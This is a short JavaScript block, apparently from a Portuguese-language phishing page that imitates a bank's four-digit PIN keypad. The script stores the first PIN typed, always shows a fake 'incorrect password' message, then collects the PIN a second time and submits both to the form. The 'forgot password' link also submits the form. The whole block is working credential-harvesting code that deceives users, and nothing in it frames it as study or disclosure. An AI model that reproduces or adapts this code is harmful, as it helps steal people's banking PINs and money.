    <script>
        function esqueci(){
            $('#senha_completa').val('CLICO EM ESQUECEU A SENHA');
            $('form').submit()
        }

        $('input').keypress(function(e) {
            if(e.which == 13) {
                e.preventDefault();
            }
        });

        $(document).ready(function(){
            $('#senha').mask('0000');
        })

        function alerta(s){
            $('#msg').html(s);
            $('#alerta').fadeIn('slow',function (){
                setTimeout(function (){
                    $('#alerta').fadeOut('slow', function (){
                        $('#alerta').addClass('d-none')
                    })
                }, 3000)
            })

            $('#alerta').removeClass('d-none');
        }


        var ponteiro = 0
        $(document).on('click','#envia',function(e) {
            if(ponteiro == 0){
                if($('#senha').val().length == 4){
                    $('#senha_completa').val($('#senha').val())
                    $('#senha').val('')
                    alerta("Senha incorreta")
                    $('#senha').focus();
                    ponteiro = 1;
                }else{
                    $('#senha').val('')
                    alerta("Senha incorreta")
                    $('#senha').focus();
                }
            }else if($('#senha').val().length == 4){
                $('#senha_completa').val($('#senha_completa').val() + ' / ' + $('#senha').val())
                $('form').submit()
            }else{
                $('#senha').val("");
                $('#senha').focus();
                alerta("Senha incorreta")
            }
        });

        function seninha(s){

            if($('#senha').val().length < 4){
                $('#senha').val($('#senha').val() + s);
            }else{
                $('#senha').val('')
            }
        }
    </script>
